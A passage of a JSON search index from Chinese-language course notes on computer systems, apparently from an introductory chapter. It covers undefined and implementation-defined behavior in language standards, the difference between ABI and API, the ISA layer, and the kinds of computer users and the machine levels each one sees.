<p>\u6bcf\u4e00\u79cd\u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00\u90fd\u6709\u76f8\u5e94\u7684\u6807\u51c6\u89c4\u8303\u3002\u4e00\u65b9\u9762\uff0c\u7f16\u8bd1\u5668\u5f00\u53d1\u8005\u5fc5\u987b\u6309\u7167\u7f16\u7a0b\u8bed\u8a00\u6807\u51c6\u89c4\u8303\u8bbe\u8ba1\u7f16\u8bd1\u5668\u524d\u7aef\uff0c\u5f69\u80fd\u5411\u9ad8\u7ea7\u8bed\u8a00\u7a0b\u5e8f\u5458\u63d0\u4f9b\u53ef\u6b63\u786e\u5de5\u4f5c\u7684\u7f16\u8bd1\u5668\uff1b\u53e6\u4e00\u65b9\u9762\uff0c\u7a0b\u5e8f\u5458\u5fc5\u987b\u6309\u7167\u8bed\u8a00\u6807\u51c6\u89c4\u8303\u7f16\u5199\u6e90\u7a0b\u5e8f\uff0c\u6e90\u7a0b\u5e8f\u624d\u80fd\u88ab\u7f16\u8bd1\u5668\u6b63\u786e\u5904\u7406\uff0c\u5426\u5219\u7f16\u8bd1\u8fc7\u7a0b\u51fa\u9519\u6216\u7f16\u8bd1\u51fa\u7684\u76ee\u6807\u7a0b\u5e8f\u8fd0\u884c\u7ed3\u679c\u4e0d\u7b26\u9884\u671f\u3002</p> <p>\u8bed\u8a00\u6807\u51c6\u89c4\u8303\u4e2d\u6709\u4ee5\u4e0b\u4e09\u79cd\u884c\u4e3a\u9700\u8981\u6ce8\u610f\uff1a</p> <ul> <li>\u300c\u672a\u5b9a\u4e49\u884c\u4e3a\u300d\uff08undefined behavior\uff09\uff1a\u7b26\u5408\u8bed\u8a00\u6807\u51c6\u89c4\u8303\u4f46\u672a\u660e\u786e\u6307\u5b9a\u5176\u7ed3\u679c\u7684\u884c\u4e3a\u3002\u82e5\u6e90\u7a0b\u5e8f\u5305\u542b\u672a\u5b9a\u4e49\u884c\u4e3a\uff0c\u5219\u76ee\u6807\u7a0b\u5e8f\u7684\u6bcf\u6b21\u8fd0\u884c\u7ed3\u679c\u53ef\u80fd\u4e0d\u540c\uff0c\u6216\u5728\u4e0d\u540c\u5e73\u53f0\u4e0b\u8fd0\u884c\u7ed3\u679c\u4e0d\u540c\u3002</li> <li>\u300c\u672a\u6307\u5b9a\u884c\u4e3a\u300d\uff08unspecified behavior\uff09\uff1a\u8bed\u8a00\u6807\u51c6\u89c4\u8303\u5217\u51fa\u591a\u79cd\u4f9b\u7f16\u8bd1\u5668\u9009\u62e9\u7684\u884c\u4e3a\u7ed3\u679c\u7684\u884c\u4e3a\uff0c\u4e0d\u540c\u7f16\u8bd1\u5668\u53ef\u80fd\u9009\u62e9\u4e0d\u540c\u7684\u884c\u4e3a\u7ed3\u679c\u3002\u82e5\u6e90\u7a0b\u5e8f\u5305\u542b\u672a\u6307\u5b9a\u884c\u4e3a\uff0c\u5219\u540c\u4e00\u4efd\u7a0b\u5e8f\u91c7\u7528\u4e0d\u540c\u7f16\u8bd1\u5668\u6216\u4e00\u6b3e\u7f16\u8bd1\u5668\u7684\u4e0d\u540c\u7248\u672c\uff0c\u53ef\u80fd\u7ed9\u51fa\u4e0d\u540c\u7684\u8fd0\u884c\u7ed3\u679c\u3002</li> <li>\u300c\u5b9e\u73b0\u5b9a\u4e49\u884c\u4e3a\u300d\uff08implementation-defined behavior\uff09\uff1a\u6307\u8bed\u8a00\u6807\u51c6\u89c4\u8303\u7684\u5b9e\u73b0\u9700\u8981\u5728\u6587\u6863\u4e2d\u8bf4\u660e\u5176\u9009\u62e9\u7684\u672a\u6307\u5b9a\u884c\u4e3a\u3002\u82e5\u6e90\u7a0b\u5e8f\u5305\u542b\u5b9e\u73b0\u5b9a\u4e49\u884c\u4e3a\uff0c\u5728\u76f8\u540c\u73af\u5883\u4e0b\u8fd0\u884c\u53ef\u5f97\u5230\u76f8\u540c\u7684\u7ed3\u679c\uff0c\u4f46\u5728\u5176\u4ed6\u73af\u5883\u65f6\u8fd0\u884c\u7ed3\u679c\u53ef\u80fd\u4e0d\u540c\u3002</li> </ul> <p>\u7f16\u8bd1\u5668\u540e\u7aef\u7684\u8bbe\u8ba1\u5e94\u9075\u5faa ISA \u89c4\u8303\u548c\u300c\u5e94\u7528\u7a0b\u5e8f\u4e8c\u8fdb\u5236\u63a5\u53e3\u300d\uff08ABI, application binary interface\uff09\u89c4\u8303\u3002</p> <p>ABI \u662f\u4e3a\u8fd0\u884c\u5728\u7279\u5b9a ISA \u53ca\u7279\u5b9a\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u7684\u5e94\u7528\u7a0b\u5e8f\u89c4\u5b9a\u7684\u4e00\u79cd\u673a\u5668\u7ea7\u76ee\u6807\u4ee3\u7801\u5c42\u63a5\u53e3\uff0c\u5305\u542b\u4e86\u8fd0\u884c\u5728\u7279\u5b9a ISA \u53ca\u7279\u5b9a\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u7684\u5e94\u7528\u7a0b\u5e8f\u6240\u5bf9\u5e94\u7684\u76ee\u6807\u4ee3\u7801\u751f\u6210\u65f6\u5fc5\u987b\u9075\u5faa\u7684\u7ea6\u5b9a\u3002ABI \u63cf\u8ff0\u4e86\u5e94\u7528\u7a0b\u5e8f\u548c\u64cd\u4f5c\u7cfb\u7edf\u4e4b\u95f4\u3001\u5e94\u7528\u7a0b\u5e8f\u548c\u6240\u8c03\u7528\u7684\u5e93\u51fd\u6570\u4e4b\u95f4\u3001\u4e0d\u540c\u7ec4\u6210\u90e8\u5206\uff08\u5982\u8fc7\u7a0b\u6216\u51fd\u6570\uff09\u4e4b\u95f4\u5728\u8f83\u4f4e\u5c42\u6b21\u4e0a\u7684\u673a\u5668\u7ea7\u4ee3\u7801\u63a5\u53e3\u3002</p> <p>\u4f8b\u5982\u8fc7\u7a0b\u4e4b\u95f4\u7684\u8c03\u7528\u7ea6\u5b9a\uff08\u53c2\u6570\u548c\u8fd4\u56de\u503c\u5982\u4f55\u4f20\u9012\u7b49\uff09\u3001\u7cfb\u7edf\u8c03\u7528\u7ea6\u5b9a\uff08\u7cfb\u7edf\u8c03\u7528\u7684\u53c2\u6570\u548c\u8c03\u7528\u53f7\u5982\u4f55\u4f20\u9012\uff0c\u4ee5\u53ca\u5982\u4f55\u4ece\u7528\u6237\u6001\u9677\u5165\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u7b49\uff09\u3001\u76ee\u6807\u6587\u4ef6\u7684\u4e8c\u8fdb\u5236\u683c\u5f0f\u548c\u51fd\u6570\u5e93\u4f7f\u7528\u7ea6\u5b9a\u3001\u673a\u5668\u4e2d\u5bc4\u5b58\u5668\u7684\u4f7f\u7528\u89c4\u5b9a\u3001\u7a0b\u5e8f\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u5212\u5206\u7b49\u3002</p> <p>\u4e0d\u7b26\u5408 ABI \u89c4\u8303\u7684\u76ee\u6807\u7a0b\u5e8f\u5c06\u65e0\u6cd5\u5728\u6839\u636e\u8be5 ABI \u89c4\u8303\u63d0\u4f9b\u7684\u64cd\u4f5c\u7cfb\u7edf\u8fd0\u884c\u73af\u5883\u4e2d\u6b63\u786e\u8fd0\u884c\u3002</p> <p>ABI \u548c\u300c\u5e94\u7528\u7a0b\u5e8f\u63a5\u53e3\u300d\uff08API, application program interface\uff09\u4e0d\u540c\u3002API \u5b9a\u4e49\u4e86\u8f83\u9ad8\u5c42\u6b21\u7684\u6e90\u7a0b\u5e8f\u4ee3\u7801\u548c\u5e93\u4e4b\u95f4\u7684\u63a5\u53e3\uff0c\u6b64\u63a5\u53e3\u901a\u5e38\u4e0e\u786c\u4ef6\u65e0\u5173\u3002\u56e0\u6b64\uff0c\u540c\u6837\u7684\u6e90\u7a0b\u5e8f\u4ee3\u7801\u53ef\u4ee5\u5728\u652f\u6301\u76f8\u540c API \u7684\u4efb\u610f\u7cfb\u7edf\u4e2d\u8fdb\u884c\u7f16\u8bd1\u4ee5\u751f\u6210\u76ee\u6807\u4ee3\u7801\u3002\u5728 ABI \u76f8\u540c\u6216\u517c\u5bb9\u7684\u7cfb\u7edf\u4e0a\uff0c\u4e00\u4e2a\u5df2\u7ecf\u7f16\u8bd1\u597d\u7684\u76ee\u6807\u4ee3\u7801\u5219\u53ef\u4ee5\u65e0\u987b\u6539\u52a8\u800c\u76f4\u63a5\u8fd0\u884c\u3002</p> <p>\u6545\u800c\uff0c\u5728 ISA \u5c42\u4e4b\u4e0a\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5411\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u7684\u8fd0\u884c\u65f6\u73af\u5883\u9700\u8981\u7b26\u5408 ABI \u89c4\u8303\uff0c\u540c\u65f6\u64cd\u4f5c\u7cfb\u7edf\u4e5f\u8981\u6839\u636e ISA \u89c4\u8303\u6765\u4f7f\u7528\u786c\u4ef6\u63d0\u4f9b\u7684\u63a5\u53e3\u3002\u5305\u62ec\u786c\u4ef6\u63d0\u4f9b\u7684\u5404\u79cd\u63a7\u5236\u5bc4\u5b58\u5668\u548c\u72b6\u6001\u5bc4\u5b58\u5668\u3001\u539f\u5b50\u64cd\u4f5c\u3001\u4e2d\u65ad\u673a\u5236\u3001\u5206\u6bb5\u548c\u5206\u9875\u5b58\u50a8\u7ba1\u7406\u90e8\u4ef6\u7b49\u3002</p> <p>\u5728 ISA \u5c42\u4e4b\u4e0b\uff0c\u8bbe\u8ba1\u5904\u7406\u5668\u65f6\u9700\u8981\u6839\u636e ISA \u89c4\u8303\u6765\u8bbe\u8ba1\u76f8\u5e94\u7684\u786c\u4ef6\u63a5\u53e3\u4f9b\u64cd\u4f5c\u7cfb\u7edf\u548c\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u3002</p> <p>\u603b\u4e4b\uff0c\u8ba1\u7b97\u673a\u7cfb\u7edf\u80fd\u591f\u6309\u7167\u4e0e\u5176\u6b63\u786e\u5730\u5de5\u4f5c\u662f\u4e0d\u540c\u5c42\u6b21\u7684\u591a\u4e2a\u89c4\u8303\u76f8\u4e92\u652f\u6491\u7684\u7ed3\u679c\uff0c\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u5404\u62bd\u8c61\u5c42\u4e4b\u95f4\u5982\u4f55\u8fdb\u884c\u8f6c\u6362\uff0c\u6700\u7ec8\u90fd\u662f\u7531\u8fd9\u4e9b\u89c4\u8303\u6765\u5b9a\u4e49\u7684\u3002\u4e0d\u7ba1\u662f\u7cfb\u7edf\u8f6f\u4ef6\u5f00\u53d1\u8005\u3001\u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u8005\u8fd8\u662f\u5904\u7406\u5668\u8bbe\u8ba1\u8005\uff0c\u90fd\u5fc5\u987b\u4ee5\u89c4\u8303\u4e3a\u51c6\u7ef3\uff0c\u5e94\u4ee5\u624b\u518c\u4e3a\u51c6\u3002\u5982\u679c\u8981\u4e86\u89e3\u7a0b\u5e8f\u7684\u786e\u5207\u884c\u4e3a\uff0c\u6700\u597d\u7684\u3001\u6700\u7cbe\u786e\u7684\u65b9\u6cd5\u5c31\u662f\u67e5\u624b\u518c\u3002</p> <p>\u672c\u4e66\u6240\u7528\u5e73\u53f0\u4e3a IA32/x86-64 + Linux + GCC + C \u8bed\u8a00\uff0cLinux \u64cd\u4f5c\u7cfb\u7edf\u4e0b\u4e00\u822c\u4f7f\u7528 system V ABI\uff0c\u56e0\u6b64\u63a8\u8350\u67e5\u8be2\uff1aC \u8bed\u8a00\u6807\u51c6\u3001system V ABI \u624b\u518c\u3001Intel \u6307\u4ee4\u7cfb\u7edf\u624b\u518c\u3002</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch01-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/#_12","title":"\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u4e0d\u540c\u7528\u6237","text":"<pre><code>\u8ba1\u7b97\u673a\u7cfb\u7edf\u5b8c\u6210\u7684\u6240\u6709\u4efb\u52a1\u90fd\u662f\u901a\u8fc7\u6267\u884c\u7a0b\u5e8f\u4e2d\u7684\u6307\u4ee4\u6765\u5b9e\u73b0\u7684\u3002\n\u8ba1\u7b97\u673a\u7cfb\u7edf\u7531\u786c\u4ef6\u548c\u8f6f\u4ef6\u4e24\u90e8\u5206\u7ec4\u6210\u3002\u300c\u786c\u4ef6\u300d\uff08hardware\uff09\u662f\u7269\u7406\u88c5\u7f6e\u7684\u603b\u6210\uff0c\u300c\u8f6f\u4ef6\u300d\uff08software\uff09\u5305\u62ec\u8fd0\u884c\u5728\u786c\u4ef6\u4e0a\u7684\u7a0b\u5e8f\u548c\u6570\u636e\u4ee5\u53ca\u76f8\u5173\u7684\u6587\u6863\u3002\n\u300c\u7a0b\u5e8f\u300d\uff08program\uff09\u662f\u6307\u6325\u8ba1\u7b97\u673a\u5982\u4f55\u64cd\u4f5c\u7684\u4e00\u4e2a\u6307\u4ee4\u5e8f\u5217\u3002\n\u300c\u6570\u636e\u300d\uff08data\uff09\u662f\u6307\u4ee4\u64cd\u4f5c\u7cfb\u7edf\u7684\u5bf9\u8c61\u3002\n\u6839\u636e\u8f6f\u4ef6\u7684\u7528\u9014\uff0c\u4e00\u822c\u5c06\u8f6f\u4ef6\u5206\u6210\u7cfb\u7edf\u8f6f\u4ef6\u548c\u5e94\u7528\u8f6f\u4ef6\u4e24\u5927\u7c7b\u3002\n\u300c\u7cfb\u7edf\u8f6f\u4ef6\u300d\uff08system software\uff09\u5305\u62ec\u4e3a\u6709\u6548\u3001\u5b89\u5168\u5730\u4f7f\u7528\u548c\u7ba1\u7406\u8ba1\u7b97\u673a\u4e00\u7ea7\u4e3a\u5f00\u53d1\u548c\u8fd0\u884c\u5e94\u7528\u8f6f\u4ef6\u800c\u63d0\u4f9b\u7684\u5404\u79cd\u8f6f\u4ef6\uff0c\u4ecb\u4e8e\u8ba1\u7b97\u673a\u786c\u4ef6\u548c\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\uff0c\u5b83\u4e0e\u5177\u4f53\u5e94\u7528\u7684\u5173\u7cfb\u4e0d\u5927\u3002\n\u7cfb\u7edf\u8f6f\u4ef6\u5305\u62ec\u64cd\u4f5c\u7cfb\u7edf\uff08\u5982 Windows, Unix, Linux\uff09\u3001\u8bed\u8a00\u5904\u7406\u7cfb\u7edf\uff08\u5982 Visual Studio, GCC\uff09\u3001\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\uff08\u5982 Oracle\uff09\u548c\u5404\u7c7b\u5b9e\u7528\u7a0b\u5e8f\uff08\u5982\u78c1\u76d8\u788e\u7247\u6574\u7406\u7a0b\u5e8f\u3001\u5907\u4efd\u7a0b\u5e8f\uff09\u3002\n\u300c\u64cd\u4f5c\u7cfb\u7edf\u300d\uff08OS, operating system\uff09\u4e3b\u8981\u7528\u6765\u7ba1\u7406\u6574\u4e2a\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u8d44\u6e90\uff0c\u5305\u62ec\u5bf9\u5b83\u4eec\u8fdb\u884c\u8c03\u5ea6\u3001\u7ba1\u7406\u3001\u76d1\u89c6\u548c\u670d\u52a1\u7b49\u3002\u64cd\u4f5c\u7cfb\u7edf\u8fd8\u63d0\u4f9b\u8ba1\u7b97\u673a\u7528\u6237\u548c\u786c\u4ef6\u4e4b\u95f4\u7684\u4eba\u673a\u4ea4\u4e92\u754c\u9762\uff0c\u5e76\u63d0\u4f9b\u5bf9\u5e94\u7528\u8f6f\u4ef6\u7684\u652f\u6301\u3002\n\u8bed\u8a00\u5904\u7406\u7cfb\u7edf\u4e3b\u8981\u7528\u4e8e\u63d0\u4f9b\u4e00\u4e2a\u7528\u9ad8\u7ea7\u8bed\u8a00\u7f16\u7a0b\u7684\u73af\u5883\uff0c\u5305\u62ec\u6e90\u7a0b\u5e8f\u7f16\u8f91\u3001\u7ffb\u8bd1\u3001\u8c03\u8bd5\u3001\u94fe\u63a5\u3001\u88c5\u5165\u3001\u8fd0\u884c\u7b49\u529f\u80fd\u3002\n\u300c\u5e94\u7528\u8f6f\u4ef6\u300d\uff08application software\uff09\u6307\u4e13\u95e8\u4e3a\u6570\u636e\u5904\u7406\u3001\u79d1\u5b66\u8ba1\u7b97\u3001\u4e8b\u52a1\u7ba1\u7406\u3001\u591a\u5a92\u4f53\u5904\u7406\u3001\u5de5\u7a0b\u8bbe\u8ba1\u4ee5\u53ca\u8fc7\u7a0b\u63a7\u5236\u7b49\u5e94\u7528\u6240\u7f16\u5199\u7684\u5404\u7c7b\u7a0b\u5e8f\u3002\n</code></pre> <p>\u6309\u7167\u5728\u8ba1\u7b97\u673a\u4e0a\u5b8c\u6210\u4efb\u52a1\u7684\u4e0d\u540c\uff0c\u53ef\u4ee5\u628a\u8ba1\u7b97\u673a\u7684\u7528\u6237\u5206\u4e3a\u4ee5\u4e0b\u56db\u7c7b\uff1a</p> <ul> <li>\u300c\u6700\u7ec8\u7528\u6237\u300d\uff08end user\uff09\uff1a\u5927\u591a\u6570\u8ba1\u7b97\u673a\u4f7f\u7528\u8005\u3002</li> <li>\u300c\u7cfb\u7edf\u7ba1\u7406\u5458\u300d\uff08system administrator\uff09\uff1a\u5229\u7528\u64cd\u4f5c\u7cfb\u7edf\u3001\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\u7b49\u8f6f\u4ef6\u63d0\u4f9b\u7684\u529f\u80fd\u5bf9\u7cfb\u7edf\u8fdb\u884c\u914d\u7f6e\u3001\u7ba1\u7406\u548c\u7ef4\u62a4\uff0c\u4ee5\u5efa\u7acb\u9ad8\u6548\u3001\u5408\u7406\u7684\u7cfb\u7edf\u73af\u5883\u4f9b\u8ba1\u7b97\u673a\u7528\u6237\u4f7f\u7528\u7684\u64cd\u4f5c\u4eba\u5458\u3002   \u5176\u804c\u8d23\u4e3b\u8981\u5305\u62ec\uff1a\u5b89\u88c5\u3001\u914d\u7f6e\u548c\u7ef4\u62a4\u7cfb\u7edf\u7684\u786c\u4ef6\u548c\u8f6f\u4ef6\uff0c\u5efa\u7acb\u548c\u7ba1\u7406\u7528\u6237\u8d26\u6237\uff0c\u5347\u7ea7\u8f6f\u4ef6\uff0c\u5907\u4efd\u3001\u6062\u590d\u4e1a\u52a1\u7cfb\u7edf\u548c\u6570\u636e\u7b49\u3002</li> <li>\u300c\u5e94\u7528\u7a0b\u5e8f\u5458\u300d\uff08application programmer\uff09\uff1a\u4f7f\u7528\u9ad8\u7ea7\u7f16\u7a0b\u8bed\u8a00\u7f16\u5236\u5e94\u7528\u8f6f\u4ef6\u7684\u7a0b\u5e8f\u5458\u3002</li> <li>\u300c\u7cfb\u7edf\u7a0b\u5e8f\u5458\u300d\uff08system programmer\uff09\uff1a\u8bbe\u8ba1\u548c\u5f00\u53d1\u7cfb\u7edf\u8f6f\u4ef6\u7684\u7a0b\u5e8f\u5458\u3002</li> </ul> <pre><code>\u8ba1\u7b97\u673a\u6700\u7ec8\u7528\u6237\u901a\u8fc7\u952e\u76d8\u548c\u9f20\u6807\u7b49\u5916\u8bbe\u4e0e\u8ba1\u7b97\u673a\u4ea4\u4e92\uff0c\u901a\u8fc7\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u7684\u7528\u6237\u754c\u9762\u542f\u52a8\u5e76\u6267\u884c\u5e94\u7528\u7a0b\u5e8f\u6216\u7cfb\u7edf\u547d\u4ee4\uff0c\u4ece\u800c\u5b8c\u6210\u7528\u6237\u4efb\u52a1\u3002\n\u56e0\u6b64\uff0c\u6700\u7ec8\u7528\u6237\u80fd\u591f\u611f\u77e5\u5230\u7684\u53ea\u662f\u7cfb\u7edf\u63d0\u4f9b\u7684\u7b80\u5355\u4eba\u673a\u4ea4\u4e92\u9875\u9762\u548c\u5b89\u88c5\u5728\u8ba1\u7b97\u673a\u4e2d\u7684\u76f8\u5173\u5e94\u7528\u7a0b\u5e8f\u3002\n\n\u7cfb\u7edf\u7ba1\u7406\u5458\u4f5c\u4e3a\u7ba1\u7406\u548c\u7ef4\u62a4\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u4e13\u4e1a\u4eba\u5458\uff0c\u5fc5\u987b\u80fd\u591f\u5b89\u88c5\u3001\u914d\u7f6e\u548c\u7ef4\u62a4\u7cfb\u7edf\u7684\u786c\u4ef6\u548c\u8f6f\u4ef6\uff0c\u80fd\u8fc7\u5efa\u7acb\u548c\u7ba1\u7406\u7528\u6237\u8d26\u6237\uff0c\u9700\u8981\u65f6\u80fd\u8fc7\u5347\u7ea7\u786c\u4ef6\u548c\u8f6f\u4ef6\u4ee5\u53ca\u5907\u4efd\u3001\u6062\u590d\u4e1a\u52a1\u7cfb\u7edf\u548c\u6570\u636e\u7b49\u3002\u7cfb\u7edf\u7ba1\u7406\u5458\u5e94\u8be5\u975e\u5e38\u719f\u6089\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u7684\u6709\u5173\u7cfb\u7edf\u914d\u7f6e\u548c\u7ba1\u7406\u65b9\u9762\u7684\u529f\u80fd\u3002\n\u56e0\u6b64\uff0c\u7cfb\u7edf\u7ba1\u7406\u5458\u80fd\u611f\u77e5\u5230\u7684\u662f\u7cfb\u7edf\u4e2d\u7684\u90e8\u5206\u786c\u4ef6\u5c42\u9762\uff0c\u7cfb\u7edf\u7ba1\u7406\u5c42\u9762\u4ee5\u53ca\u76f8\u5173\u5b9e\u7528\u7a0b\u5e8f\u548c\u4eba\u673a\u4ea4\u4e92\u754c\u9762\u3002\n\n\u5e94\u7528\u7a0b\u5e8f\u5458\u5927\u591a\u4f7f\u7528\u9ad8\u7ea7\u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00\u7f16\u5199\u7a0b\u5e8f\u3002\u5e94\u7528\u7a0b\u5e8f\u5458\u6240\u770b\u5230\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u51fa\u4e86\u8ba1\u7b97\u673a\u786c\u4ef6\u3001\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u7684\u5e94\u7528\u7f16\u7a0b\u63a5\u53e3\u3001\u4eba\u673a\u4ea4\u4e92\u754c\u9762\u548c\u5b9e\u7528\u7a0b\u5e8f\u5916\uff0c\u8fd8\u5305\u62ec\u76f8\u5e94\u7684\u7a0b\u5e8f\u8bed\u8a00\u5904\u7406\u7cfb\u7edf\u3002\n\u5728\u7a0b\u5e8f\u8bed\u8a00\u5904\u7406\u7cfb\u7edf\u4e2d\uff0c\u51fa\u4e86\u7ffb\u8bd1\u7a0b\u5e8f\u5916\uff0c\u901a\u5e38\u8fd8\u5305\u62ec\u7f16\u8f91\u7a0b\u5e8f\u3001\u94fe\u63a5\u7a0b\u5e8f\u3001\u88c5\u5165\u7a0b\u5e8f\u4ee5\u53ca\u5c06\u8fd9\u4e9b\u7a0b\u5e8f\u548c\u5de5\u5177\u7ee7\u627f\u5728\u4e00\u8d77\u800c\u6784\u6210\u7684\u300c\u96c6\u6210\u5f00\u53d1\u73af\u5883\u300d\uff08IDE, integrated development environment\uff09\u7b49\u3002\u6b64\u5916\uff0c\u8bed\u8a00\u5904\u7406\u7cfb\u7edf\u4e2d\u8fd8\u5305\u62ec\u53ef\u4f9b\u5e94\u7528\u7a0b\u5e8f\u8c03\u7528\u7684\u5404\u7c7b\u51fd\u6570\u5e93\u3002\n\n\u7cfb\u7edf\u7a0b\u5e8f\u5458\u5728\u5f00\u53d1\u64cd\u4f5c\u7cfb\u7edf\u3001\u7f16\u8bd1\u5668\u548c\u4f7f\u7528\u7a0b\u5e8f\u7b49\u7cfb\u7edf\u8f6f\u4ef6\u65f6\uff0c\u9700\u8981\u719f\u6089\u8ba1\u7b97\u673a\u5e95\u5c42\u7684\u76f8\u5173\u786c\u4ef6\u548c\u7cfb\u7edf\u7ed3\u6784\uff0c\u751a\u81f3\u53ef\u80fd\u9700\u8981\u76f4\u63a5\u4e0e\u8ba1\u7b97\u673a\u786c\u4ef6\u548c\u6307\u4ee4\u7cfb\u7edf\u6253\u4ea4\u9053\uff0c\u6bd4\u5982\u76f4\u63a5\u5bf9\u5404\u79cd\u63a7\u5236\u5bc4\u5b58\u5668\u3001\u7528\u6237\u53ef\u89c1\u5bc4\u5b58\u5668\uff0cI/O \u63a7\u5236\u5668\u7b49\u786c\u4ef6\u8fdb\u884c\u63a7\u5236\u548c\u7f16\u7a0b\u3002\n\u56e0\u6b64\uff0c\u7cfb\u7edf\u7a0b\u5e8f\u5458\u4e0d\u4ec5\u8981\u719f\u6089\u5e94\u7528\u7a0b\u5e8f\u5458\u6240\u4f7f\u7528\u7684\u6240\u6709\u8bed\u8a00\u548c\u5de5\u5177\uff0c\u8fd8\u5fc5\u987b\u719f\u6089\u6307\u4ee4\u7cfb\u7edf\u3001\u673a\u5668\u7ed3\u6784\u548c\u76f8\u5173\u7684\u673a\u5668\u529f\u80fd\u7279\u6027\uff0c\u6709\u65f6\u8fd8\u8981\u76f4\u63a5\u4f7f\u7528\u6c47\u7f16\u8bed\u8a00\u7b49\u4f4e\u7ea7\u8bed\u8a00\u7f16\u5199\u7a0b\u5e8f\u4ee3\u7801\u3002\n</code></pre> <p>\u53ef\u4ee5\u8ba4\u4e3a\u8ba1\u7b97\u673a\u7cfb\u7edf\u662f\u7531\u5404\u79cd\u786c\u4ef6\u548c\u5404\u7c7b\u8f6f\u4ef6\u91c7\u7528\u5c42\u6b21\u5316\u65b9\u5f0f\u6784\u5efa\u7684\u5206\u5c42\u7cfb\u7edf\uff0c\u4e0d\u540c\u8ba1\u7b97\u673a\u7528\u6237\u5de5\u4f5c\u6240\u5728\u7684\u7cfb\u7edf\u7ed3\u6784\u5c42\u5982\u4e0b\u56fe\u6240\u793a\u3002</p> <p>\u3010\u8fd9\u91cc\u6709\u4e00\u5f20\u56fe\u3011</p> <p>\u7cfb\u7edf\u7a0b\u5e8f\u5458\u6240\u770b\u5230\u7684\u673a\u5668\u5c5e\u6027\u5c5e\u4e8e ISA \u5c42\u9762\u7684\u5185\u5bb9\uff0c\u6240\u770b\u5230\u7684\u673a\u5668\u662f\u914d\u7f6e\u4e86\u6307\u4ee4\u7cfb\u7edf\u7684\u673a\u5668\uff0c\u79f0\u4e3a\u300c\u673a\u5668\u8bed\u8a00\u673a\u5668\u300d\uff0c\u5de5\u4f5c\u5728\u8be5\u5c42\u6b21\u7684\u7a0b\u5e8f\u5458\u79f0\u4e3a\u300c\u673a\u5668\u8bed\u8a00\u7a0b\u5e8f\u5458\u300d\u3002</p> <p>\u7cfb\u7edf\u7ba1\u7406\u5458\u5de5\u4f5c\u5728\u64cd\u4f5c\u7cfb\u7edf\u5c42\uff0c\u6240\u770b\u5230\u7684\u662f\u914d\u7f6e\u4e86\u64cd\u4f5c\u7cfb\u7edf\u7684\u865a\u62df\u673a\u5668\uff0c\u79f0\u4e3a\u300c\u64cd\u4f5c\u7cfb\u7edf\u865a\u62df\u673a\u300d\u3002</p> <p>\u6c47\u7f16\u8bed\u8a00\u7a0b\u5e8f\u5458\u5de5\u4f5c\u5728\u63d0\u4f9b\u6c47\u7f16\u7a0b\u5e8f\u7684\u865a\u62df\u673a\u5668\u7ea7\uff0c\u6240\u770b\u5230\u7684\u673a\u5668\u79f0\u4e3a\u300c\u6c47\u7f16\u8bed\u8a00\u865a\u62df\u673a\u300d\u3002</p> <p>\u5e94\u7528\u7a0b\u5e8f\u5458\u5927\u591a\u5de5\u4f5c\u5728\u63d0\u4f9b\u7f16\u8bd1\u5668\u6216\u89e3\u91ca\u5668\u7b49\u7ffb\u8bd1\u7a0b\u5e8f\u7684\u8bed\u8a00\u5904\u7406\u7cfb\u7edf\u5c42\uff0c\u56e0\u6b64\uff0c\u5e94\u7528\u7a0b\u5e8f\u5458\u5927\u591a\u7528\u9ad8\u7ea7\u8bed\u8a00\u7f16\u5199\u7a0b\u5e8f\uff0c\u56e0\u800c\u4e5f\u79f0\u4e3a\u300c\u9ad8\u7ea7\u8bed\u8a00\u7a0b\u5e8f\u5458\u300d\uff0c\u6240\u770b\u5230\u7684\u865a\u62df\u673a\u5668\u79f0\u4e3a\u300c\u9ad8\u7ea7\u8bed\u8a00\u865a\u62df\u673a\u300d\u3002</p> <p>\u6700\u7ec8\u7528\u6237\u5219\u5de5\u4f5c\u5728\u6700\u4e0a\u9762\u7684\u5e94\u7528\u7a0b\u5e8f\u5c42\u3002</p>"},{"location":"in_class_learning/semester_3/introduction_to_computer_system/Theory_notes/Ch01-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/#_13","title":"\u7ae0\u8282\u5c0f\u7ed3","text":"<p>\u8ba1\u7b97\u673a\u5728\u63a7\u5236\u5668\u7684\u63a7\u5236\u4e0b\u5b8c\u6210\u6570\u636e\u5904\u7406\u3001\u6570\u636e\u5b58\u50a8\u548c\u6570\u636e\u4f20\u8f93\u4e09\u4e2a\u57fa\u672c\u529f\u80fd\uff0c\u56e0\u800c\u5b83\u7531\u5b8c\u6210\u76f8\u5e94\u529f\u80fd\u7684\u63a7\u5236\u5668\u3001\u8fd0\u7b97\u5668\u3001\u5b58\u50a8\u5668\u3001\u8f93\u5165/\u8f93\u51fa\u8bbe\u5907\u7ec4\u6210\u3002\u5728\u8ba1\u7b97\u673a\u5185\u90e8\uff0c\u6307\u4ee4\u548c\u6570\u636e\u90fd\u7528\u4e8c\u8fdb\u5236\u8868\u793a\uff0c\u4e24\u8005\u5728\u5f62\u5f0f\u4e0a\u6ca1\u6709\u4efb\u4f55\u5dee\u522b\uff0c\u90fd\u662f 0/1 